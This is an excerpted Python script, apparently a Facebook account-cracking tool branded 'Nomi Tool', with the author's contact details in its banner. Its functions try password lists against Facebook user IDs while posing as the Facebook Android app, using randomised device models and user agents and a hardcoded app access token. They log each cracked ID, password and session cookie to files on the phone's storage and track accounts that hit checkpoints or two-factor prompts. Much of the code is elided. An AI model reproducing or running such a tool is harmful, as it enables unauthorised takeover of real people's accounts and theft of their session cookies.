...
\t[×] Developed By Malik Nomi{EXTRA} (Nomi)
{WHITE}[•] AUTHOR       : Malik Brand
{WHITE}[•] STYLE         : BUAHAHAHAHAHHAHH
{WHITE}[•] WhatsApp     :   +923061850182
[•] FaceBook     :   Noman Saleem
[•] Version      :   {RED}6.10
{WHITE}[•] YouTube      :   Nomitricker

{WHITE}================================================
   \33[37;41m\t Welcome x To x Nomi  x Tool\33[0;m
{WHITE}=================================================""")
def linex():
    print('\033[1;37m----------------------------------------------')
...
def approval():
  ...
  try:
    ...
    if realid in httpCaht:
      ...
      #print('\33[1;37m ====================================================')
      print (" \33[37;41m\t WELCOME TO NomiI TOOL AND ENJOY \33[0;m")
      #print('\33[1;37m ====================================================')
        ...
        try:
             ...
             #   clear()
                ...
                if x == ("***"):
                        ...
                        print('[5] AUTO 2 FACTOR BULK FILE')
                        print('[6] FOLLOW FB')
                        print('[0] EXIT ')
                        linex()
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [Nomi-RUNING-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [LEGEND-Nomi-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                     #   print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/Nomi-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/Nomi-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                            #    print('\r\r \033[1;34m[Nomi-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                              #  print('\r\r\x1b[1;31m [ALONE-Nomi-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [Nomi-RUNING-M2 ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api1(ids,names,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [Nomi-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/196.0.0.25;FBBV/730050789;FBDM/{density=1.0,width=1080,height=1920};FBLC/en_GB;FBRV/600108626;FBCR/Plus;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3125;FBSV/6.0.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/196.0.0.10;FBBV/596517353;FBDM/{density=2.5,width=1080,height=1920};FBLC/en_PK;FBRV/148014708;FBCR/Singtel;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3263;FBSV/1.3.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/95.0.0.34.183;FBBV/92323450;[FBAN/Orca-Android;FBAV/160.0.0.35.174;FBBV/92323450;FBRV/18933560;FBPN/com.facebook.orca;FBLC/en_BD;FBCR/PK-UFONE;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 11 Lite;FBSV/8.1.1;FBCA/arm64-v8a:null;FBDM/density=2.75,width=1104,height=2344;FB_FW/1;]','[FBAN/FB4A;FBAV/319.0.0.9.197;FBBV/687102275;FBDM/{density=2.2,width=1080,height=1448};FBLC/en_US;FBRV/0;FBCR/Zong Nepal;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/ Mi 9;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672640;FBDM/{density=2.0,width=720,height=1456};FBLC/ru_RU;FBRV/314609338;FBCR/MTS RUS;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX2021;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]','Mozilla/5.0 (Linux; Android 12; RMX3195 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]','[FBAN/FB4A;FBAV/270.1.0.66.127;FBBV/214895222;FBDM/{density=3.0,width=1080,height=2081};FBLC/en_US;FBRV/215203224;FBCR/Jio 4G;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1806;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]','Dalvik/2.1.0 (Linux; U; Android 10; realme 2 Build/QQ3A.200805.001)','Mozilla/5.0 (Linux; Android 6.0.1; SM-N916S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/389.0.0.42.111;]','Mozilla/5.0 (Linux; Android 6.0.1; SM-N916L Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [LEGEND-Nomi-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/Nomi-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/Nomi-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [Nomi-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Nomi-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
                ...
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/Nomi-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/Nomi-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
